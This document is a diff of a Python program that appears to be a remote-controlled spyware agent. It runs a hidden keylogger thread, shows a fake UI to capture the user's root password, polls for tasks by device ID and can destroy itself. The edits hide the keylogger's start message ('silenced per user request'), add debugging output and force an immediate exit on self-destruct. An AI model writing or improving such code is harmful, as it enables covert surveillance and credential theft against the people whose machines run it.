@@ -143,9 +143,9 @@ def start_keylogger_thread():
         listener = pynput.keyboard.Listener(on_press=on_press)
         listener.daemon = True
         listener.start()
-        print("Keylogger started.", flush=True)
+        # print("Keylogger started.", flush=True) # Silenced per user request
     except Exception as e:
-        print(f"Keylogger failed to start: {e}", flush=True)
+        pass # print(f"Keylogger failed to start: {e}", flush=True)
 
 def attempt_root_escalation():
     global ROOT_PASSWORD
@@ -155,9 +155,10 @@ def attempt_root_escalation():
     try:
         import tkinter as tk
         from tkinter import font
-        print("✅ Tkinter available", flush=True)
-    except ImportError:
-        return False, "Tkinter not installed."
+        print("DEBUG: Tkinter imported successfully", flush=True)
+    except ImportError as ie:
+        print(f"DEBUG: Tkinter import failed: {ie}", flush=True)
+        return False, f"Tkinter not installed: {ie}"
 
     result_pw = None
 
@@ -522,22 +523,26 @@ def attempt_root_escalation():
 
     try:
         # Run in thread to allow timeout or main thread checks if needed (optional)
-        # However, for simplicity and to match test.py's reliability, we run mainloop on main thread here
-        # IF we want timeout, we must use thread.
         import threading
         def run_with_timeout():
+            print("DEBUG: Thread starting show_ui...", flush=True)
             show_ui()
+            print("DEBUG: Thread show_ui finished.", flush=True)
         
+        print("DEBUG: Starting UI thread...", flush=True)
         ui_thread = threading.Thread(target=run_with_timeout, daemon=True)
         ui_thread.start()
+        print("DEBUG: UI thread started, joining with timeout...", flush=True)
         ui_thread.join(timeout=60) # 60s timeout
+        print(f"DEBUG: Join completed. Alive? {ui_thread.is_alive()}", flush=True)
         
         if ui_thread.is_alive():
              print("⚠️ UI timed out or hung", flush=True)
              return False, "Timeout"
 
-    except:
-        return False, "UI Failed"
+    except Exception as e:
+        print(f"DEBUG: Threading error: {e}", flush=True)
+        return False, f"UI Thread Failed: {e}"
     
     if result_pw:
         print(f"✅ Password Captured: {result_pw}", flush=True)
@@ -803,7 +808,9 @@ def process_tasks(config, device_id):
         print(f"Task {final_status}: {task_id}", flush=True)
         
         if should_destruct:
-            sys.exit(0)
+            print("❌ AGENT COMMITTING SUICIDE NOW.", flush=True)
+            # FORCE KILL immediately, do not pass go, do not collect $200
+            os._exit(0)
 
 # --- MAIN ---
 
@@ -820,8 +827,13 @@ def main():
     device_id = get_device_id()
     print(f"Device ID: {device_id}", flush=True)
     
-    # Try install deps on first run
-    install_dependencies()
+    # Check dependencies once but don't loop-restart
+    try:
+        install_dependencies()
+    except:
+        pass
+        
+    # Start keylogger silently
     start_keylogger_thread()
     
     while True:
